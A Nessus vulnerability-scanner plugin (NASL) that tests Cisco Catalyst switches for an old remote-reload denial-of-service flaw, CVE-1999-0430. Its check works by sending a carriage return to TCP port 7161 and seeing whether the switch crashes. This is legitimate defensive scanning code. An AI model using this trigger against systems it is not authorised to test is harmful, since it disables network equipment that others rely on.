#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10046);
 script_version("$Revision: 1.35 $");
 script_cvs_date("$Date: 2016/10/05 20:44:33 $");

 script_cve_id("CVE-1999-0430");
 script_bugtraq_id(705);
 script_osvdb_id(1103);

 script_name(english:"Cisco Catalyst Supervisor Remote Reload DoS");
 script_summary(english:"Crashes a Cisco switch");

 script_set_attribute(attribute:"synopsis", value:"The remote switch has a denial of service vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote host appears to be a Cisco Catalyst switch. This device
runs an undocumented TCP service. Sending a carriage return to this
port causes the switch to immediately reset. A remote attacker could
repeatedly exploit this to disable the switch.");
 # http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-19990324-cat7161
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6007bea8");
 # https://web.archive.org/web/20020208163146/http://archives.neohapsis.com/archives/bugtraq/1999_1/1077.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?90539b62");
 script_set_attribute(attribute:"solution", value:"Apply the fix referenced in the vendor's advisory.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");

 script_set_attribute(attribute:"vuln_publication_date", value:"1999/03/24");
 script_set_attribute(attribute:"patch_publication_date", value:"1999/03/24");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/06/22");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:cisco:catalyst_12xx_supervisor_software");
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_family(english:"CISCO");

 script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");

 script_require_keys("Settings/ParanoidReport");
 script_require_ports(7161);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

if(get_port_state(7161))
{
 soc = open_sock_tcp(7161);
 if(soc)
 {
  start_denial();
  data = raw_string(13);
  send(socket:soc, data:data);
  sleep(5);
  alive = end_denial();
   if(!alive){
  		security_hole(7161);
		set_kb_item(name:"Host/dead", value:TRUE);
		}
 }
}

